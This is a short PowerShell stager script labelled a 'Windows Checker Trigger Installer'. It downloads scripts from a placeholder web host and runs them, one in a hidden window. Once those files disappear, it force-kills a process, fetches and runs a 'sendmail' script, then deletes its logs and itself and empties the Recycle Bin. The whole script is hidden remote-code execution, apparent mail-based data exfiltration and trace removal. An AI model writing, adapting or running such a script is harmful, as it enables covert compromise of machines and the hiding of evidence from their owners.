#### Windows Checker Trigger Installer Script (PowerShell) ####
function download {
	(New-Object System.Net.WebClient).DownloadFile('http://<your_web_host>/winchk1.bat','winchk1.bat');Start-Process -WindowStyle hidden .\winchk1.bat
	(New-Object System.Net.WebClient).DownloadFile('http://<your_web_host>/winchk2.ps1','winchk2.ps1');.\winchk2.ps1
	(New-Object System.Net.WebClient).DownloadFile('http:/<your_web_host>/winchk3.ps1','winchk3.ps1');.\winchk3.ps1
}


function sendmail {
	Do
	{
	$FileNames = @('winchk1.bat','winchk2.ps1','winchk3.ps1')
	
	if (Get-ChildItem -Recurse -Include winchk*.*)
		{
		Write-Host "Script Files Exist"
		$File = $true
		Start-Sleep -Seconds 5
		}

	else
		{
		Write-Host "Script Files Do Not Exist"
		$File = $false
		Stop-Process -name ApplicationFrameHost.exe -Force
		(New-Object System.Net.WebClient).DownloadFile('http://<your_web_host>/sendmail.ps1','sendmail.ps1')
		./sendmail.ps1
		
		Remove-Item -Recurse -Path .\*.log
		Remove-Item -Recurse -Path .\trigger.ps1
    Remove-Item -Recurse -Path .\sendmail.ps1
    Clear-RecycleBin -Force
		EXIT
		}
	}	until($File = $false)
}


download
sendmail
EXIT
